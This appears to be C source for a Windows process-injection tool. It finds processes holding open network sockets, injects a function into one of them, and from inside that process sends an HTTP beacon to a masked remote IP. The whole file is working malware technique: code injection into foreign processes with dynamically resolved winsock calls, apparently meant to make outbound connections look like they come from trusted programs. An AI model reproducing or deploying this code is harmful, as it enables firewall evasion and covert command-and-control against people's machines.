#include <windows.h>
#include <winsock.h>

#include "dmode.c"
#include "pInject.c"
#include "FindSocketHandles.c"

unsigned long InjectedFuncState; // global to notify the process injector of the injector func state
unsigned long LastEntryInjected = 0;

#define FUNC_INCOMPLETE 1 // a list of states InjectedFuncState can be
#define FUNC_SUCCESS 0
#define FUNC_FAILURE -1
#define FUNC_CONNECT_FAILURE -2 // important enough for its own code

typedef int (WINAPI *WSASTRT)
(WORD, LPWSADATA);

typedef SOCKET(WINAPI *SOKT)
(int, int, int);

typedef unsigned long (WINAPI *INET_ADR)
(const char*);

typedef unsigned short (WINAPI *HTNS)
(unsigned short);

typedef int (WINAPI *CNNCT)
(SOCKET, const struct sockaddr*, int);

typedef int (WINAPI *SND)
(SOCKET, const char*, int, int);

typedef int (WINAPI *CLSE_SCK)
(SOCKET);

typedef int (WINAPI *WSACLEAN)
();

/* crap so we can dynamically load winsock */

#define WSK_SENDSTR "GET /scripts/index.php?scan=hello%20from%20me HTTP/1.0\nFrom: Darth_Vader\nUser-Agent: Force/1.0\n\n"

int InjectedMeat(LPARAM lParam) {
    // we can make any in-modular calls in the other process space here
    // beware of inter-modular calls, as they may have been located in different 
    // places. this is why i've loaded winsock dynamically

    HMODULE hWinsock2;
    SOCKET mySock;
    WSADATA wsa_data;
    struct sockaddr_in RemoteAddrInfo;
    WSASTRT MyWSAStartup;
    SOKT MySocket;
    INET_ADR MyInetAddr;
    HTNS MyHtons;
    CNNCT MyConnect;
    SND MySend;
    CLSE_SCK MyCloseSocket;
    WSACLEAN MyWSACleanup;

    InjectedFuncState = FUNC_INCOMPLETE;

    hWinsock2 = LoadLibrary("ws2_32.dll");
    if (hWinsock2 == NULL) {
        InjectedFuncState = FUNC_FAILURE;
        ExitThread(-1);
    }

    // at this point we assume it is all there, expect to die horribly if not
    MyWSAStartup = (WSASTRT) GetProcAddress(hWinsock2, "WSAStartup");
    MySocket = (SOKT) GetProcAddress(hWinsock2, "socket");
    MyInetAddr = (INET_ADR) GetProcAddress(hWinsock2, "inet_addr");
    MyHtons = (HTNS) GetProcAddress(hWinsock2, "htons");
    MyConnect = (CNNCT) GetProcAddress(hWinsock2, "connect");
    MySend = (SND) GetProcAddress(hWinsock2, "send");
    MyCloseSocket = (CLSE_SCK) GetProcAddress(hWinsock2, "closesocket");
    MyWSACleanup = (WSACLEAN) GetProcAddress(hWinsock2, "WSACleanup");

    if (MyWSAStartup(MAKEWORD(2, 0), &wsa_data) != 0) {
        InjectedFuncState = FUNC_FAILURE;
        WinMain(NULL, NULL, NULL, 0);
        ExitThread(0);
    }

    mySock = MySocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (mySock == INVALID_SOCKET) {
        InjectedFuncState = FUNC_FAILURE;
        WinMain(NULL, NULL, NULL, 0);
        ExitThread(-1);
    }

    ZeroMemory(&RemoteAddrInfo, sizeof (struct sockaddr_in));
    RemoteAddrInfo.sin_family = AF_INET;
    RemoteAddrInfo.sin_addr.s_addr = MyInetAddr("*************");
    RemoteAddrInfo.sin_port = MyHtons(80);

    if (MyConnect(mySock, (struct sockaddr *) &RemoteAddrInfo, sizeof (RemoteAddrInfo)) < 0) {

        InjectedFuncState = FUNC_CONNECT_FAILURE;
        WinMain(NULL, NULL, NULL, 0);
        ExitThread(-1);
    }

    MySend(mySock, WSK_SENDSTR, strlen(WSK_SENDSTR), 0);

    MyCloseSocket(mySock);
    MyWSACleanup(&wsa_data);

    InjectedFuncState = FUNC_SUCCESS;
    ExitThread(0);
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
        LPSTR lpCmdLine, int nShowCmd) {
    int ret;
    DWORD cbNeeded, dwRandIndex;
    POPEN_SOCK_HANDLE_INFO_EX pOSHIEx;
    char debugout[255];

    pOSHIEx = malloc(1);
    DebugMode(TRUE); //checking

    FindPIDsWithSocketHandles(pOSHIEx, 1, &cbNeeded);
 
    pOSHIEx = realloc(pOSHIEx, cbNeeded);
    // should probably check these
    FindPIDsWithSocketHandles(pOSHIEx, cbNeeded, &cbNeeded);
    // don't pass null for that last param, it'll probably crash 'n' burn
    // note: you can check the return values here
    // anything positive is a success - the number above zero indicates warnings

    dwRandIndex = 1 + LastEntryInjected;
    if (dwRandIndex > pOSHIEx->NumberOfEntries - 1) {
        //we've probably used all our processes
        MessageBox(NULL, "CatastrophicError!", "PJECT", MB_ICONWARNING); //
        ExitThread(0);
    }

    LastEntryInjected++;

    sprintf(debugout, "injecting pid %d from %d poss", pOSHIEx->OpenSockHandleInfo[dwRandIndex].dwPid, pOSHIEx->NumberOfEntries);
    MessageBox(NULL, debugout, "INFO", MB_OK);

    ret = pInject(GetModuleHandle(NULL), pOSHIEx->OpenSockHandleInfo[dwRandIndex].dwPid, &InjectedMeat, GetCurrentProcessId());

    switch (ret) {
        case PINJECT_MEM_ERR:
            MessageBox(NULL, "THERE WAS A MEMORY ERROR", "ERROR", MB_OK);
            break;
        case PINJECT_RELOC_ERR:
            MessageBox(NULL, "THERE WAS A RELOC ERROR", "ERROR", MB_OK);
            break;
        case PINJECT_PROC_ACCESS_ERR:
            MessageBox(NULL, "THERE WAS A PROCESS ACCESS ERROR", "ERROR", MB_OK);
            break;
        case PINJECT_NO_RELOC:
            MessageBox(NULL, "NO RELOC TABLE", "ERROR", MB_OK);
    }


    return 0;
}

